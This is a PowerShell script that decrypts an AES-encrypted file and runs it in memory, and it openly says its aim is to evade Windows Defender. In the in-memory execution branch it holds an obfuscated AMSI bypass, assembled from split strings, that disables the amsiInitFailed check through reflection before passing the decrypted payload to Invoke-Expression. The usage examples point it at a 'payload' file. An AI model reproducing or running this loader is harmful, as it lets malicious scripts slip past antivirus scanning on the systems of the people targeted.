<#
.SYNOPSIS
Decrypts an AES-256-CBC encrypted file and optionally executes it in memory. This is usefull to Evade windwos defender as it executes encrypted sicripts in memory and disable in-mempry detection.

.DESCRIPTION
Invoke-EncryptedScript decrypts a file encrypted with AES-256 in CBC mode
using a Base64-encoded key and IV.

The decrypted content can be:
- Written to disk
- Executed in memory as a PowerShell script
- Loaded in memory as a PowerShell module (dot-sourced)

The encrypted file must be raw AES output (binary), not Base64 text.

.PARAMETER KeyB64
Base64-encoded AES key.
Must decode to exactly 32 bytes (AES-256).

.PARAMETER IVB64
Base64-encoded initialization vector (IV).
Must decode to exactly 16 bytes (AES block size).

.PARAMETER InputFile
Path to the encrypted input file (binary AES ciphertext).

.PARAMETER OutputFile
Path where the decrypted output will be written.
Required unless -InMemory is specified.

.PARAMETER InMemory
Executes or loads the decrypted content directly in memory
instead of writing it to disk.

.PARAMETER Script
Indicates the decrypted content is a PowerShell script
and should be executed immediately in memory.
Requires -InMemory.

.PARAMETER Module
Indicates the decrypted content is a PowerShell module or script
that defines functions and should be dot-sourced into the current session.
Requires -InMemory.

.EXAMPLE
Decrypt a file and write it to disk:

Invoke-EncryptedScript `
 -KeyB64 "XcZmx2575OrQf6Cdab8b7PpmAF5oWldanJPO9tgnjGg=" `
 -IVB64  "auwKIxny5J/eNmo03VDnNg==" `
 -InputFile ".\payload.ps1.enc" `
 -OutputFile ".\payload.ps1"

.EXAMPLE
Decrypt and execute a PowerShell script in memory:

Invoke-EncryptedScript `
 -KeyB64 "XcZmx2575OrQf6Cdab8b7PpmAF5oWldanJPO9tgnjGg=" `
 -IVB64  "auwKIxny5J/eNmo03VDnNg==" `
 -InputFile ".\script.ps1.enc" `
 -InMemory `
 -Script

.EXAMPLE
Decrypt and load a module or function-only script in memory:

Invoke-EncryptedScript `
 -KeyB64 "XcZmx2575OrQf6Cdab8b7PpmAF5oWldanJPO9tgnjGg=" `
 -IVB64  "auwKIxny5J/eNmo03VDnNg==" `
 -InputFile ".\module.ps1.enc" `
 -InMemory `
 -Module

.EXAMPLE
View full help:

Get-Help Invoke-EncryptedScript -Full

.NOTES
Author: <you>
AES Mode : CBC
Padding  : PKCS7
Key Size : 256-bit

The encrypted file must be generated using the same
key, IV, mode, and padding parameters.

#>

function Invoke-EncryptedScript {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$KeyB64,

        [Parameter(Mandatory)]
        [string]$IVB64,

        [Parameter(Mandatory)]
        [string]$InputFile,

        [string]$OutputFile,

        [switch]$InMemory,
        [switch]$Module,
        [switch]$Script
    )

    $Key = [Convert]::FromBase64String($KeyB64)
    $IV  = [Convert]::FromBase64String($IVB64)
    $CipherBytes = [System.IO.File]::ReadAllBytes($InputFile)

    $AES = [System.Security.Cryptography.Aes]::Create()
    $AES.KeySize = 256
    $AES.Mode = 'CBC'
    $AES.Padding = 'PKCS7'
    $AES.Key = $Key
    $AES.IV  = $IV

    $Decryptor = $AES.CreateDecryptor()
    $PlainBytes = $Decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
    $ScriptText = [System.Text.Encoding]::UTF8.GetString($PlainBytes)

    if ($InMemory -and $Script) {
        $c = "A";$b = "ms";$d = "iUt";$g = "ils";$res = $c+$b+$d+$g;$w = "am";$s = 'siI';$j = 'nit';$k = 'Fai';$r = 'led';$no = $null;$val = "SetValue";$res2 = $w+$s+$j+$k+$r;$a = [Ref].Assembly.GetType("System.Management.Automation.$res");$a2= $a.GetField($res2, 'NonPublic,Static');$a2.$val($null, $true)    
        Write-Verbose "Executing decrypted script in memory"
        Invoke-Expression $ScriptText
    }elseif ($InMemory -and $Module) {
        Write-Verbose "Loading decrypted module in memory"
        . ([ScriptBlock]::Create($ScriptText))
    }else {
        if (-not $OutputFile) {
            throw "OutputFile is required unless -InMemory is used"
        }

        [System.IO.File]::WriteAllBytes($OutputFile, $PlainBytes)
        Write-Host "[+] Decrypted -> $OutputFile"
    }
}
